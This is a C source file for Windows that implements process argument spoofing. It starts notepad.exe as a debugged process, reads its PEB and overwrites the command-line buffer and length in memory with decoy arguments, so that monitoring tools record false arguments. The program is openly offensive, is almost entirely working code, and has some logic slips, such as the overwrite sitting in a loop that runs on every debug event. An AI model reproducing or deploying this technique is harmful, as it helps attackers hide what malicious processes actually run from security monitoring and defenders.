#include <Windows.h>
#include <stdio.h>
#include <winternl.h>  

typedef NTSTATUS(WINAPI* NtQueryInformationProcess_t)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG); 

int main(int argc, char** argv)
{

    DWORD newUnicodeLen = 28;

    DWORD retLen = NULL; 

    SIZE_T bytesRead    = NULL;  
    SIZE_T bytesWritten = NULL;  

    STARTUPINFOW          si = { 0 };
    PROCESS_INFORMATION   pi = { 0 };

    DEBUG_EVENT           DbgEvent  = { 0 };
    PEB                   targetPEB = { 0 };

    PROCESS_BASIC_INFORMATION pbi = { 0 };

    RTL_USER_PROCESS_PARAMETERS params = { sizeof(RTL_USER_PROCESS_PARAMETERS) };  

    WCHAR targetProcess[]  = L"notepad.exe C:\\Windows\\System32\\kernel32.dll";        
    WCHAR spoofedProcess[] = L"notepad.exe C:\\Users\\geistmeister\\dummy.txt\0"; 

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Create target process
    printf("[*] Starting target process\n");
    if (!CreateProcessW(NULL, targetProcess, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, L"C:\\Windows\\System32\\", &si, &pi)) { 
        fprintf(stderr, "[-] Failed to create target process. (E%lu)\n\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] Process created successfully with PID: %i\n\n", pi.dwProcessId); 

    while (1) {
        if (WaitForDebugEvent(&DbgEvent, INFINITE)) {
            switch (DbgEvent.dwDebugEventCode) {
            case CREATE_PROCESS_DEBUG_EVENT:
                // Fetch PEB from target process
                printf("[*] Retrieving PEB\n");

                NtQueryInformationProcess_t queryProc = (NtQueryInformationProcess_t)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtQueryInformationProcess");
                queryProc(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen); 
                
                printf("[+] PEB located at address 0x%08x\n\n", (UINT)&pbi);

                if (!ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &targetPEB, sizeof(PEB), &bytesRead)) { 
                    fprintf(stderr, "[-] Failed to retrieve parameters. (E%lu)\n\n", GetLastError());
                    return EXIT_FAILURE;
                };

                // Extract params from PEB
                printf("[*] Locating target params\n"); 

                if (!ReadProcessMemory(pi.hProcess, targetPEB.ProcessParameters, &params, sizeof(params), &bytesRead)) { 
                    fprintf(stderr, "[-] Failed to retrieve parameters. (E%lu)\n\n", GetLastError());
                    return EXIT_FAILURE;
                };

                printf("[+] Parameters located\n\n");

                break;

            }

        }
        
        // Set spoofed args
        printf("[*] Spoofing target arguments\n");
         
        if (!WriteProcessMemory(pi.hProcess, params.CommandLine.Buffer, (PVOID)spoofedProcess, sizeof(spoofedProcess), &bytesWritten)) { 
            fprintf(stderr, "[-] Failed to set spoofed args. (E%lu)\n\n", GetLastError()); 
            return EXIT_FAILURE; 
        };

        // Write in spoofed args
        WriteProcessMemory(pi.hProcess, (PCHAR)targetPEB.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length), (PVOID)&newUnicodeLen, 4, &bytesWritten);
        printf("[+] New arguments set\n\n");

        // Detach process from debugger
        if (!DebugActiveProcessStop(pi.dwProcessId)) {
            fprintf(stderr, "[-] Failed to detach the process. (E%lu)\n", GetLastError());
            return EXIT_FAILURE;
        }

        printf("[+] Process detached\n");
                
    }  

    CloseHandle(pi.hProcess);    
    CloseHandle(pi.hThread);  
    
    return 0;

}
